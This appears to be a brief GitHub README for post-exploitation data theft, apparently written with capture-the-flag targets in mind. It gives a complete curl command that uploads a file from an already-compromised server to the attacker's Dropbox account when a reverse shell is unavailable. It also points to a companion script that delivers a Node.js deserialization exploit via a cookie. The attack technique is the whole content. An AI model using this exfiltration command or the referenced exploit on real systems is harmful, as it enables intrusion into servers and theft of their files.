# RCE_Send_data

Let's take the case when you have exploited a vulnerability in a server and trying to obtain a reverse shell but you are not able to obtain it (no netcat or sh not linked to bash or no python, could be any reason).  
In that case you can send the file (which you want to read) to your dropbox account by executing the following curl command.  
(I know there can be a lot of ways to read a file, I'm just suggesting one.) 

`curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer <ACCESS_TOKEN>" --header "Dropbox-API-Arg: {\"path\": \"/folder1/flag.txt\"}" --header "Content-Type: application/octet-stream" --data-binary @flag.txt`

This will send the file `flag.txt` to specified path `/folder1/flag.txt`.  

#### Prerequisite
you need to have a dropbox account and access_token for that. you can get it by following this [article](http://99rabbits.com/get-dropbox-access-token/)

The file `send_request.py` sends post request with cookie containig data which is getting exploited by node js deserialization [exploit](https://www.exploit-db.com/exploits/49552).
check you commands from file `text.js`.
